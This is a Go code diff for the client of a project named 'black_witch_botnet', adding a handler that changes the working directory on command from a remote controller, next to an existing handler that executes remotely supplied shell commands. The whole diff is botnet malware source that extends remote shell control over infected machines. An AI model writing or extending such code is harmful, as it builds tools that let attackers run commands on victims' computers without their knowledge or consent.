@@ -1,8 +1,9 @@
 package client
 
 import (
-	"os/exec"
 	"black_witch_botnet/relations"
+	"os"
+	"os/exec"
 	"strings"
 )
 
@@ -34,8 +35,8 @@ func (h *Handler) handleShell(req *relations.ShellCommand) interface{} {
 	switch req.Type {
 	case relations.ShellTypeExec:
 		return h.execShell(req)
-	//case relations.ShellTypeChangeDir:
-	//	return h.changeDirShell(req)
+	case relations.ShellTypeChangeDir:
+		return h.changeDirShell(req)
 	default:
 		return &relations.ErrorResult{
 			Code: relations.ErrorUnknownShellType,
@@ -82,6 +83,23 @@ func (h *Handler) execShell(req *relations.ShellCommand) interface{} {
 	return res
 }
 
-//func (h *Handler) changeDirShell(req *relations.ShellCommand) interface{} {
-//
-//}
+func (h *Handler) changeDirShell(req *relations.ShellCommand) interface{} {
+	path := strings.TrimSpace(string(req.Data))
+	err := os.Chdir(path)
+
+	if err != nil {
+		req := &relations.ErrorResult{
+			Code: relations.ErrorChangeDir,
+			Data: []byte(err.Error()),
+		}
+
+		return req
+	}
+
+	res := &relations.ShellResult{
+		Exit:   0,
+		Stdout: []byte("success"),
+	}
+
+	return res
+}
